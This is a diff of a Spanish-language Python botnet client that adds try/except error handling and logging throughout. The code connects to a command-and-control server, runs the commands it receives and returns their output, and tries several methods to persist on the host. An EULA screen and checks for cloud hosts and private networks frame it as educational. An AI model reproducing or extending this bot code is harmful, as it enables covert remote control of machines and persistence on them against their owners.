@@ -38,42 +38,45 @@ def configurar_logging():
     Los mensajes de log se escriben en el archivo de log y en la consola.
     """
 
-    config_path = os.path.join(BASE_DIR, "config", "config.ini")
-    if not os.path.exists(config_path):
-        print("[ERROR] No se encontró config.ini en la carpeta config/")
-        sys.exit(1)
+    try:
+        config_path = os.path.join(BASE_DIR, "config", "config.ini")
+        if not os.path.exists(config_path):
+            print("[ERROR] No se encontró config.ini en la carpeta config/")
+            sys.exit(1)
 
-    config = configparser.ConfigParser()
-    config.read(config_path)
+        config = configparser.ConfigParser()
+        config.read(config_path)
 
-    # Ruta absoluta para el directorio de logs en el directorio raíz del proyecto
-    log_dir = os.path.join(BASE_DIR, config.get("LOGGING", "LOG_DIR", fallback="logs"))
-    log_file = config.get("LOGGING", "CLIENT_LOG_FILE", fallback="client.log")
+        # Ruta absoluta para el directorio de logs en el directorio raíz del proyecto
+        log_dir = os.path.join(BASE_DIR, config.get("LOGGING", "LOG_DIR", fallback="logs"))
+        log_file = config.get("LOGGING", "CLIENT_LOG_FILE", fallback="client.log")
 
-    # Asegurar que la carpeta logs exista en el directorio raíz del proyecto
-    os.makedirs(log_dir, exist_ok=True)
+        # Asegurar que la carpeta logs exista en el directorio raíz del proyecto
+        os.makedirs(log_dir, exist_ok=True)
 
-    log_path = os.path.join(log_dir, log_file)
+        log_path = os.path.join(log_dir, log_file)
 
-    log_level = config.get("LOGGING", "LOG_LEVEL", fallback="INFO").upper()
-    log_levels = {
-        "DEBUG": logging.DEBUG,
-        "INFO": logging.INFO,
-        "WARNING": logging.WARNING,
-        "ERROR": logging.ERROR,
-        "CRITICAL": logging.CRITICAL
-    }
+        log_level = config.get("LOGGING", "LOG_LEVEL", fallback="INFO").upper()
+        log_levels = {
+            "DEBUG": logging.DEBUG,
+            "INFO": logging.INFO,
+            "WARNING": logging.WARNING,
+            "ERROR": logging.ERROR,
+            "CRITICAL": logging.CRITICAL
+        }
 
-    logging.basicConfig(
-        level=log_levels.get(log_level, logging.INFO),
-        format="%(asctime)s - %(levelname)s - %(message)s",
-        handlers=[
-            logging.FileHandler(log_path, encoding="utf-8"),  # Guardar en archivo
-            logging.StreamHandler()  # Mostrar en pantalla
-        ]
-    )
+        logging.basicConfig(
+            level=log_levels.get(log_level, logging.INFO),
+            format="%(asctime)s - %(levelname)s - %(message)s",
+            handlers=[
+                logging.FileHandler(log_path, encoding="utf-8"),  # Guardar en archivo
+                logging.StreamHandler()  # Mostrar en pantalla
+            ]
+        )
 
-    logging.info(f"Logging configurado correctamente en {log_path}")
+        logging.info(f"Logging configurado correctamente en {log_path}")
+    except Exception as e:
+        logging.error(f"Error al configurar el logging: {e}")
 
 # Llamar a la función de configuración de logging al inicio del script
 configurar_logging()
@@ -94,8 +97,12 @@ def validar_ip(ip):
     bool: True si la IP es válida, False en caso contrario.
     """
     
-    patron = re.compile(r"^(?:\d{1,3}\.){3}\d{1,3}$")
-    return patron.match(ip) is not None
+    try:
+        patron = re.compile(r"^(?:\d{1,3}\.){3}\d{1,3}$")
+        return patron.match(ip) is not None
+    except Exception as e:
+        logging.error(f"Error al validar la IP: {e}")
+        return False
 
 def validar_puerto(port):
     
@@ -111,7 +118,11 @@ def validar_puerto(port):
     bool: True si el puerto es válido, False en caso contrario.
     """
 
-    return 1 <= port <= 65535
+    try:
+        return 1 <= port <= 65535
+    except Exception as e:
+        logging.error(f"Error al validar el puerto: {e}")
+        return False
 
 def esEntornoCloud():
     
@@ -130,6 +141,8 @@ def esEntornoCloud():
             return True
     except requests.exceptions.RequestException:
         pass
+    except Exception as e:
+        logging.error(f"Error al detectar el entorno cloud: {e}")
 
     try:
         # Google Cloud Metadata
@@ -137,6 +150,8 @@ def esEntornoCloud():
             return True
     except requests.exceptions.RequestException:
         pass
+    except Exception as e:
+        logging.error(f"Error al detectar el entorno cloud: {e}")
 
     return False
 
@@ -156,7 +171,8 @@ def es_red_privada(ip):
 
     try:
         return ipaddress.ip_address(ip).is_private
-    except ValueError:
+    except ValueError as e:
+        logging.error(f"Error al verificar si la IP es privada: {e}")
         return False
     
 def verificar_eula(tipo):
@@ -165,50 +181,54 @@ def verificar_eula(tipo):
     
     :param tipo: "servidor" o "cliente" para determinar qué EULA verificar.
     """
-    if tipo not in ["servidor", "cliente"]:
-        raise ValueError("Tipo de EULA no válido. Debe ser 'servidor' o 'cliente'.")
+    try:
+        if tipo not in ["servidor", "cliente"]:
+            raise ValueError("Tipo de EULA no válido. Debe ser 'servidor' o 'cliente'.")
 
-    # Ruta para el archivo EULA en la carpeta docs
-    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-    eula_path = os.path.join(BASE_DIR, "..", "docs", f"eula_{tipo}.txt")
+        # Ruta para el archivo EULA en la carpeta docs
+        BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+        eula_path = os.path.join(BASE_DIR, "..", "docs", f"eula_{tipo}.txt")
 
-    # Si no existe, lo crea
-    if not os.path.exists(eula_path):
-        with open(eula_path, "w") as f:
-            f.write("ACCEPTED=False")
+        # Si no existe, lo crea
+        if not os.path.exists(eula_path):
+            with open(eula_path, "w") as f:
+                f.write("ACCEPTED=False")
 
-    # Leer si ya aceptó
-    with open(eula_path, "r") as f:
-        for linea in f:
-            if "ACCEPTED=True" in linea:
-                return True
+        # Leer si ya aceptó
+        with open(eula_path, "r") as f:
+            for linea in f:
+                if "ACCEPTED=True" in linea:
+                    return True
 
-    # Mostrar Acuerdo de Licencia
-    print("\n" + "="*50)
-    print(f"📜  ACUERDO DE LICENCIA ({tipo.upper()}) 📜")
-    print("="*50)
-    print("\nEste software es exclusivamente para propósitos educativos y de investigación.")
-    print("El uso en redes ajenas sin autorización está prohibido.")
-    print("El usuario debe cumplir con las leyes de su país.")
-    print("No se permite el uso de este software en redes públicas.")
-    print("El autor no se hace responsable del uso indebido.\n")
-    
-    print("🔴  QUEDA TERMINANTEMENTE PROHIBIDO:")
-    print("   - Usarlo con intenciones maliciosas.")
-    print("   - Ejecutarlo en infraestructuras críticas sin permiso.")
-    print("   - Modificarlo para evadir restricciones.")
-    print("   - Distribuirlo con fines ilegales o comerciales.\n")
-    
-    print("💡  Al escribir 'ACEPTO', el usuario declara que asume toda la responsabilidad sobre su uso.\n")
-    
-    respuesta = input("Escriba 'ACEPTO' para continuar: ").strip().upper()
-    
-    if respuesta == "ACEPTO":
-        with open(eula_path, "w") as f:
-            f.write("ACCEPTED=True")
-        return True
-    else:
-        print("Debe aceptar la licencia para usar este software.")
+        # Mostrar Acuerdo de Licencia
+        print("\n" + "="*50)
+        print(f"📜  ACUERDO DE LICENCIA ({tipo.upper()}) 📜")
+        print("="*50)
+        print("\nEste software es exclusivamente para propósitos educativos y de investigación.")
+        print("El uso en redes ajenas sin autorización está prohibido.")
+        print("El usuario debe cumplir con las leyes de su país.")
+        print("No se permite el uso de este software en redes públicas.")
+        print("El autor no se hace responsable del uso indebido.\n")
+        
+        print("🔴  QUEDA TERMINANTEMENTE PROHIBIDO:")
+        print("   - Usarlo con intenciones maliciosas.")
+        print("   - Ejecutarlo en infraestructuras críticas sin permiso.")
+        print("   - Modificarlo para evadir restricciones.")
+        print("   - Distribuirlo con fines ilegales o comerciales.\n")
+        
+        print("💡  Al escribir 'ACEPTO', el usuario declara que asume toda la responsabilidad sobre su uso.\n")
+        
+        respuesta = input("Escriba 'ACEPTO' para continuar: ").strip().upper()
+        
+        if respuesta == "ACEPTO":
+            with open(eula_path, "w") as f:
+                f.write("ACCEPTED=True")
+            return True
+        else:
+            print("Debe aceptar la licencia para usar este software.")
+            exit()
+    except Exception as e:
+        logging.error(f"Error al verificar el EULA: {e}")
         exit()
 
 def detectar_sistema():
@@ -219,7 +239,11 @@ def detectar_sistema():
     Usa la función platform.system() para determinar el sistema operativo
     del bot y devuelve el resultado en minúsculas, ya sea "windows" o "linux".
     """
-    return platform.system().lower()  # "windows" o "linux"
+    try:
+        return platform.system().lower()  # "windows" o "linux"
+    except Exception as e:
+        logging.error(f"Error al detectar el sistema operativo: {e}")
+        return "desconocido"
 
 def conectar_a_CnC():
     try:
@@ -301,7 +325,8 @@ def intentar_persistencia():
                 persistencia_exitosa = True
                 mensaje_final = f"[OK] Persistencia establecida con: {cmd.split()[0]}"
                 break  # Detener el intento tras el primer éxito
-        except Exception:
+        except Exception as e:
+            logging.error(f"Error al intentar establecer persistencia: {e}")
             continue  # Si un método falla, probar el siguiente
 
     return mensaje_final
@@ -325,6 +350,9 @@ def esperar_ordenes(bot):
 
             bot.send(resultado if resultado else b"Comando ejecutado sin salida")
 
+        except ConnectionResetError:
+            logging.info("El servidor ha cerrado la conexión.")
+            break
         except Exception as e:
             logging.error(f"Error en la comunicación con el servidor: {traceback.format_exc()}")
             break
@@ -349,31 +377,37 @@ def ejecutar_bot():
     :return: None
     """
 
-    bot = conectar_a_CnC() # Conectar al servidor C&C
-    esperar_ordenes(bot) # Esperar y procesar órdenes
+    try:
+        bot = conectar_a_CnC() # Conectar al servidor C&C
+        esperar_ordenes(bot) # Esperar y procesar órdenes
+    except Exception as e:
+        logging.error(f"Error al ejecutar el bot: {e}")
 
 if __name__ == "__main__":
-    if not validar_ip(args.host):
-        logging.error("[ERROR] IP no válida.")
-        sys.exit(1)
-        
-    if not validar_puerto(args.port):
-        logging.error("[ERROR] Puerto fuera de rango (1-65535).")
-        sys.exit(1)
-        
-    verificar_eula("cliente")
-    HOST = args.host
-    PORT = args.port
+    try:
+        if not validar_ip(args.host):
+            logging.error("[ERROR] IP no válida.")
+            sys.exit(1)
+            
+        if not validar_puerto(args.port):
+            logging.error("[ERROR] Puerto fuera de rango (1-65535).")
+            sys.exit(1)
+            
+        verificar_eula("cliente")
+        HOST = args.host
+        PORT = args.port
 
-    logging.info(f"Conectando a {HOST}:{PORT} con autenticación segura...")
+        logging.info(f"Conectando a {HOST}:{PORT} con autenticación segura...")
 
-    if esEntornoCloud():
-        logging.error("[ERROR] No puedes ejecutar este programa en un servidor cloud.")
-        sys.exit(1)
-    if not es_red_privada(HOST):
-        logging.error("[ERROR] No puedes ejecutar este servidor fuera de una red privada.")
-        sys.exit(1)
+        if esEntornoCloud():
+            logging.error("[ERROR] No puedes ejecutar este programa en un servidor cloud.")
+            sys.exit(1)
+        if not es_red_privada(HOST):
+            logging.error("[ERROR] No puedes ejecutar este servidor fuera de una red privada.")
+            sys.exit(1)
 
-    SECRET_KEY = args.key
-    bot = conectar_a_CnC()
-    esperar_ordenes(bot)
+        SECRET_KEY = args.key
+        bot = conectar_a_CnC()
+        esperar_ordenes(bot)
+    except Exception as e:
+        logging.error(f"Error en la ejecución principal: {e}")
